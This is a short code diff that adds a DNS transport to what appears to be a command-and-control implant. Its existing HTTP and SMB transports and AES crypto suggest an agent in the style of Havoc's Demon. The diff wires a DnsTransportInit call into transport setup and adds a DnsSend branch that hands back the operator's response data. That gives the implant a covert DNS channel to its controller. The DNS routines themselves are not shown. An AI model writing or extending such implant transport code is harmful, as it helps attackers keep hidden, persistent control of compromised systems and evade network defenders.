@@ -7,6 +7,7 @@
 #include <core/MiniStd.h>
 #include <core/TransportHttp.h>
 #include <core/TransportSmb.h>
+#include <core/TransportDns.h>
 
 #include <crypt/AesCrypt.h>
 
@@ -46,6 +47,12 @@ BOOL TransportInit( )
     }
 #endif
 
+#ifdef TRANSPORT_DNS
+    Success = DnsTransportInit();
+    if ( Success )
+        Instance->Session.Connected = TRUE;
+#endif
+
     return Success;
 }
 
@@ -76,6 +83,21 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 
     if ( SmbSend( &Send ) )
     {
+        return TRUE;
+    }
+
+#endif
+
+#ifdef TRANSPORT_DNS
+
+    if ( DnsSend( &Send, &Resp ) )
+    {
+        if ( RecvData )
+            *RecvData = Resp.Buffer;
+
+        if ( RecvSize )
+            *RecvSize = Resp.Length;
+
         return TRUE;
     }
 
